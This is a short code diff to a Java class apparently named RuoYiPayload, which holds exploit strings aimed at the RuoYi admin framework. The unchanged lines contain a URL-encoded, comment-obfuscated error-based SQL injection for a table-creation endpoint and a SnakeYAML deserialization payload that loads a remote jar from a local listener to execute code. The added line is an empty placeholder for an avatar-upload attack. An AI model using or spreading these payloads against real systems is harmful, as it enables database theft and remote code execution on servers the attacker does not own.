@@ -13,4 +13,6 @@ public class RuoYiPayload {
     public static final String SQL_tool_gen_createTable = "sql=CREATE+table+ss1+as+SELECT%2F**%2F*+FROM+sys_job+WHERE+1%3D1+union%2F**%2FSELECT%2F**%2Fextractvalue(1%2Cconcat(0x7e%2C(select%2F**%2Fversion())%2C0x7e))%3B";
 
     public static final String RCE_snakeyaml = "org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]]]]')";
+
+    public static final String UPLOAD_system_user_profile_updateAvatar = "";
 }
